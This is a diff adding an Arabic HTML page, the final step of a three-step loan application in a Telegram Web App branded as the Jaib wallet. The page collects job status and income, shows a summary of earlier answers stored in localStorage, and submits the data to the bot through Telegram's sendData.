@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>جيب (Jaib) - ملخص طلب القرض</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- ✅ Arabic Font (Tajawal) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --jaib-red: #D9142B;          /* Jaib Signature Crimson Red */
+            --jaib-red-dark: #B00E21;
+            --jaib-dark: #18181B;         /* Deep Charcoal Text */
+            --jaib-accent-red: #C81026;
+            --bg-color: #F7F7F8;
+            --card-bg: #FFFFFF;
+            --soft-red-bg: #FFF5F6;
+            --soft-red-border: #FAD1D6;
+            --text-main: #111111;
+            --text-muted: #666666;
+            --input-border: #E5E7EB;
+            --btn-gray: #F0F2F5;
+            --btn-gray-text: #444444;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        /* Top Header Navigation Bar - Jaib Red */
+        .app-header {
+            width: 100%;
+            background-color: var(--jaib-red);
+            height: 62px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(217, 20, 43, 0.22);
+        }
+
+        .back-btn-top {
+            color: #FFFFFF;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .header-brand {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .jaib-logo-badge {
+            width: 32px;
+            height: 32px;
+            background: #FFFFFF;
+            border-radius: 9px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.12);
+        }
+
+        .header-title {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 20px;
+            font-weight: 900;
+            color: #FFFFFF;
+        }
+
+        .header-title .region {
+            color: var(--jaib-red);
+            background: #FFFFFF;
+            font-size: 12px;
+            font-weight: 800;
+            padding: 2px 8px;
+            border-radius: 5px;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: #FFFFFF;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 20px;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
+            border: 1px solid #F0F0F0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 25px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 900;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--jaib-accent-red);
+            text-align: center;
+            margin-bottom: 22px;
+            font-weight: 800;
+        }
+
+        /* Step Progress Bar (All 3 Steps Active) */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 30px;
+            width: 100%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 6px;
+            background-color: #E5E7EB;
+            border-radius: 3px;
+        }
+
+        .step-bar.active {
+            background-color: var(--jaib-red);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--jaib-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 13px 16px;
+            border: 2px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #FFFFFF;
+            color: #111111;
+            outline: none;
+            width: 100%;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-control::placeholder {
+            color: #A0AEC0;
+        }
+
+        .form-control:focus {
+            border-color: var(--jaib-red-dark);
+            box-shadow: 0 0 0 3px rgba(217, 20, 43, 0.1);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23D9142B' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 16px center;
+            background-size: 15px;
+            padding-left: 42px;
+            cursor: pointer;
+        }
+
+        /* Summary Box with Jaib Red Accent Border */
+        .summary-card {
+            background-color: var(--soft-red-bg);
+            border-right: 4px solid var(--jaib-red);
+            padding: 18px 16px;
+            border-radius: 12px;
+            margin: 10px 0 24px;
+            border-top: 1px solid var(--soft-red-border);
+            border-left: 1px solid var(--soft-red-border);
+            border-bottom: 1px solid var(--soft-red-border);
+        }
+
+        .summary-card h3 {
+            margin: 0 0 14px 0;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--jaib-dark);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed #F3BAC2;
+            gap: 12px;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: #555555;
+            font-size: 14px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .summary-value {
+            font-weight: 800;
+            font-size: 14px;
+            color: #111111;
+            text-align: left;
+        }
+
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #E2E6EA;
+        }
+
+        .btn-next {
+            background-color: var(--jaib-red);
+            color: #FFFFFF;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(217, 20, 43, 0.32);
+        }
+
+        .btn-next:active {
+            background-color: var(--jaib-red-dark);
+            transform: scale(0.99);
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Jaib Red Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← رجوع</a>
+    <div class="header-brand">
+        <div class="jaib-logo-badge">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M4 6H8M11 6H19V13C19 16.866 15.866 20 12 20C8.13401 20 5 16.866 5 13V11" stroke="#D9142B" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+                <circle cx="9.5" cy="10.5" r="2" fill="#D9142B"/>
+            </svg>
+        </div>
+        <div class="header-title">
+            <span>جيب</span><span class="region">Jaib</span>
+        </div>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">طلب القرض</h1>
+    <div class="subtext">الخطوة 3 من 3</div>
+
+    <!-- Step Bar Progress Indicators (All 3 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <!-- Form & Dynamic Summary -->
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">الحالة الوظيفية</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Employed" selected>موظف</option>
+                <option value="Self-Employed / Businessman">أعمال حرة / صاحب مشروع</option>
+                <option value="Student">طالب</option>
+                <option value="Unemployed">غير موظف</option>
+                <option value="Retired">متقاعد</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">متوسط الدخل الشهري (YER)</label>
+            <input type="number" id="income" class="form-control" placeholder="مثال: 150000" min="0" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>ملخص الطلب</h3>
+
+            <div class="summary-row">
+                <span class="summary-label">مبلغ القرض:</span>
+                <span class="summary-value" id="sumAmount">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">مدة السداد:</span>
+                <span class="summary-value" id="sumDuration">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">الغرض من القرض:</span>
+                <span class="summary-value" id="sumPurpose">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">مقدم الطلب:</span>
+                <span class="summary-value" id="sumName">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">رقم الهاتف:</span>
+                <span class="summary-value" id="sumPhone">--</span>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
+            <button type="submit" class="btn-next">إرسال الطلب</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 محفظة جيب (Jaib) - اليمن #تغنيك_عن_الجميع
+</div>
+
+<script>
+function formatDurationArabic(term) {
+    const months = Number(String(term).replace(/\D/g, ''));
+    if (!months) return term;
+    return (months >= 3 && months <= 10) ? `${months} أشهر` : `${months} شهر`;
+}
+
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    // Retrieve storage items from Step 1 and Step 2
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration') || localStorage.getItem('duration');
+    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    // Format & Populate Summary
+    if (amount) {
+        const numAmount = Number(String(amount).replace(/\D/g, ''));
+        document.getElementById('sumAmount').innerText = numAmount
+            ? `${numAmount.toLocaleString('en-US')} YER`
+            : `${amount} YER`;
+    } else {
+        document.getElementById('sumAmount').innerText = "--";
+    }
+
+    document.getElementById('sumDuration').innerText = term ? formatDurationArabic(term) : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+967 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) {
+        alert("يرجى إدخال متوسط الدخل الشهري.");
+        return;
+    }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
+        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration') || localStorage.getItem('duration'),
+        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "YER"
+    };
+
+    // Save final submission profile details
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 300);
+    } else {
+        console.log("Submitted payload:", data);
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() {
+    window.location.href = "/page3";
+}
+</script>
+
+</body>
+</html>
